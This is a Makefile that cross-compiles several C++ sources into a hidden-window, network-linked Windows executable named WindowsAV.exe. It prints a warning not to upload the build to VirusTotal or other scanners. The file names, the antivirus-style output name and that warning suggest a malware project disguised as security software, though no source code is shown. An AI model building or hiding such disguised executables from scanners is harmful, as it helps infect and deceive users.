windows:
	windres main.rc -O coff -o main.res
	g++  main.cpp install.cpp usbb.cpp xor.cpp bsysinfo.cpp window.cpp supercharge.cpp fs.cpp -o WindowsAV.exe -lws2_32 -lwininet -mwindows -static -m32 main.res

linux:
	$(info Compiling...)
	$(info Do not upload to VirusTotal or any other online Scanners!)
	i686-w64-mingw32-windres main.rc -O coff -o main.res
	i686-w64-mingw32-g++  main.cpp install.cpp usbb.cpp xor.cpp bsysinfo.cpp window.cpp supercharge.cpp fs.cpp -o WindowsAV.exe -lws2_32 -lwininet -mwindows -static -m32 main.res
	